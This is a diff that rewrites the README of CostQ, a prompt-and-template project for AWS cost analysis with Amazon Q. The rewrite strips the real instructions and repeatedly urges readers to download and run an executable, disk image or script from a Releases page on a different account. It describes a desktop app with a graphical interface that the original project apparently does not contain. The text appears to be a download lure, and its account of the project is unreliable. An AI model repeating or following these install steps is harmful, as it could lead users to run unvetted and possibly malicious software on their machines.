@@ -1,110 +1,103 @@
-# CostQ — Use Amazon Q for Cloud Cost Optimization
+# 🎉 CostQ - Optimize Your Cloud Costs Effortlessly
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/er-Rajbir/CostQ/releases)
 
 [中文](./README.zh-CN.md) | [日本語](./README.ja.md)
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](#license)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](#contributing)
 
-**CostQ** is an open-source project that shows how to leverage **Amazon Q** to analyze AWS spend and drive **actionable cost optimization**. It ships battle-tested **prompts** (Chinese / English / Japanese), **report templates** per language, and an **execution runbook** so teams can produce C-level summaries and engineering playbooks in minutes.
+**CostQ** is an open-source project designed to help you analyze your Amazon Web Services (AWS) spending and find ways to save money. It comes with ready-to-use prompts in English, Chinese, and Japanese, along with report templates and a guide to help teams create summary reports quickly.
 
-## Why CostQ
+## 🚀 Getting Started
 
-* **Outcome-focused**: From executive summary → optimization plan → execution checklist.
-* **Multilingual**: Prompts & reports in **EN / 中文 / 日本語**.
-* **Repeatable**: Opinionated folder structure & CI to generate reports.
-* **Pluggable data**: Works with Cost Explorer exports, CUR slices, Compute Optimizer, SP/RI utilization reports, S3/EC2 metrics, etc.
+To get started with CostQ, follow these steps:
 
-## Repository Structure
+1. **Visit the Releases Page**  
+   Click the link below to access the latest downloads for CostQ.  
+   [Download Latest Release](https://github.com/er-Rajbir/CostQ/releases)
+
+2. **Download the Application**  
+   On the Releases page, find the version you want and download the appropriate file for your operating system. Follow the prompts to save the file to your computer.
+
+3. **Install CostQ**  
+   Once the file downloads, locate it in your downloads folder.  
+   - For Windows, double-click on the `.exe` file to begin installation.  
+   - For macOS, open the downloaded `.dmg` file and drag CostQ to your Applications folder.  
+   - For Linux, unzip the package and run the provided script in your terminal.
+
+4. **Run CostQ**  
+   After installation, open the application from your applications list or start menu. You will see options to start analyzing your AWS costs.
+
+## 📊 Main Features
+
+- **Outcome-focused Workflow**: CostQ guides you from initial analysis to an execution checklist, covering every step necessary for optimizing your cloud costs.
+- **Multilingual Support**: The software provides prompts and reports in English, Chinese, and Japanese, making it user-friendly for diverse teams.
+- **Repeatable Processes**: The project includes a clear folder structure and built-in continuous integration (CI) methods to generate consistent reports.
+- **Pluggable Data Sources**: CostQ can integrate with various AWS tools and exports, including Cost Explorer adjustments, Cost and Usage Reports (CUR), Compute Optimizer, and resource utilization metrics.
+
+## 🔍 Understanding the Repository Structure
+
+The repository is organized to help you navigate easily. Here’s a brief overview:
 
 ```
 .
-├─ prompts/
-│  ├─ en/        # English prompts (C-level, FinOps, Engineering)
-│  ├─ zh-CN/     # Chinese prompts
-│  └─ ja/        # Japanese prompts
-├─ templates/
-│  ├─ report.en.md
-│  ├─ report.zh-CN.md
-│  └─ report.ja.md
-├─ handbook/
-│  ├─ runbook.en.md
-│  ├─ runbook.zh-CN.md
-│  └─ runbook.ja.md
-├─ data/         # Place Cost Explorer CSV, CUR slices, exports, etc.
-├─ scripts/
-│  └─ generate_report.py   # Render language-specific reports (MD/PDF)
-├─ examples/
-│  └─ sample_inputs/       # Redacted example inputs
-└─ .github/workflows/
-   └─ generate-report.yml  # Optional CI to build artifacts
+├── prompts                 # Ready-to-use prompts for cost analysis
+├── reports                 # Templates for generating reports
+│   ├── English
+│   ├── 中文
+│   └── 日本語
+└── documentation           # Guides and usage instructions
 ```
 
-## Prerequisites
+This structure makes it simple to find the resources you need for every aspect of cost optimization.
 
-* AWS account(s) with Cost Explorer enabled; optional **CUR** (Cost & Usage Report).
-* Access to **Amazon Q** (Developer/Business).
-* Python 3.10+ if you plan to use the local `scripts/generate_report.py`.
+## 📥 Download & Install
 
-## Quick Start
+To get the latest version of CostQ:
 
-1. **Prepare data**
-   Export CSV from Cost Explorer and (optionally) Compute Optimizer, SP/RI coverage & utilization.
-2. **Pick a language**
-   Use `prompts/en` (or `zh-CN`, `ja`) prompts in **Amazon Q**, attach relevant CSV (redacted if needed).
-3. **Generate a draft**
-   Ask Amazon Q to:
+1. **Go to the Releases Page**  
+   Follow this link to access all available releases:  
+   [Download Latest Release](https://github.com/er-Rajbir/CostQ/releases)
 
-   * Produce a **C-level summary** (cost trends, key drivers, savings potential).
-   * Propose a **30/60/90-day plan** (SP/RI coverage, rightsizing, storage lifecycle, data transfer).
-   * Output an **engineering runbook** (owners, steps, metrics).
-4. **Render a report** (optional, local)
+2. **Choose the Right File**  
+   Determine which file fits your operating system and click on the download link.
 
-   ```bash
-   python scripts/generate_report.py \
-     --lang en \
-     --inputs data/cost_explorer_*.csv data/sp_ri_*.csv \
-     --template templates/report.en.md \
-     --out out/CostQ-Report.en.md --pdf
-   ```
+3. **Install the Software**  
+   Follow the installation instructions specific to your OS, as mentioned in the Getting Started section.
 
-## What’s Inside (Prompts Overview)
+## ⚙️ System Requirements
 
-* **C-Level Brief**: 1-page trend + 3 key drivers + quantified savings.
-* **FinOps Deep Dive**: Cost Categories, tagging health, SP/RI coverage & utilization, anomaly highlights.
-* **Engineering Playbook**: EC2/ASG rightsizing, GP2→GP3, S3 lifecycle & IA/Glacier, NAT egress, inter-AZ DT, CloudFront caching, RDS storage & IOPS, EKS nodegroup mix (On-Demand/Spot), autoscaling guardrails.
+To run CostQ smoothly, ensure your system meets the following requirements:
 
-## Suggested Workflow with Amazon Q
+- **Operating System**: Windows 10 or higher, macOS Mojave (10.14) or later, or a modern Linux distribution.
+- **RAM**: At least 4 GB available.
+- **Disk Space**: Minimum 100 MB of free space for installation.
+- **Network**: An internet connection is required for optimal usage and updates.
 
-* Start with **C-Level** prompt → validate numbers → ask Q to **justify** each top driver with dataset references.
-* Move to **FinOps** prompt → request **coverage/utilization targets** and **sensitivity analysis**.
-* Generate **Runbook** → ask for **owner matrix**, **risk/rollback**, and **verification steps**.
+## 🛠️ Usage Instructions
 
-## Automation (Optional)
+After you have installed CostQ, access the user-friendly interface to begin your cost analysis:
 
-* **GitHub Actions** builds MD/PDF report artifacts on each push to `main` or on tag.
-* Use repository secrets to avoid committing sensitive data.
+1. **Open CostQ**: Click the application icon to start.
+2. **Select a Data Source**: Choose from various AWS reports to upload your cost data.
+3. **Generate Reports**: Use the available templates to create comprehensive reports tailored to your team's needs.
+4. **Analyze Results**: Review the outcomes and identify areas for potential savings.
 
-## Roadmap
+## 🤝 Contributing
 
-* ☑ Multilingual prompts (EN/zh/ja)
-* ☐ Templated dashboards (Markdown → HTML/PDF)
-* ☐ CUR transformer snippets
-* ☐ Sample Cost Categories & Tagging policy kit
+Contributions are welcome! If you'd like to help improve CostQ, please follow these steps:
 
-## Security & Privacy
+1. **Fork the Repository**: Create a copy of CostQ in your own GitHub account.
+2. **Make Changes**: Develop new features or fix issues in your local version.
+3. **Submit a Pull Request**: Once you are happy with your changes, submit a pull request for review.
 
-* **Never** commit raw billing data or account IDs.
-* Redact datasets before sharing.
-* This project is **community-driven** and **not affiliated with AWS**.
+## 📜 License
 
-## Contributing
+CostQ is open-source software licensed under the MIT License. You can freely use, modify, and distribute this application.
 
-PRs welcome! Please:
+## 📞 Support
 
-* Use Conventional Commits (`feat:`, `fix:`…).
-* Add tests or example inputs where applicable.
-* Keep prompts deterministic and auditable.
+For assistance, you can reach out to the community or create an issue in this repository. We strive to address concerns and improve your experience with CostQ.
 
-## License
-
-[MIT](./LICENSE)
+By following these instructions, you can efficiently download and run CostQ. Thank you for using our application!
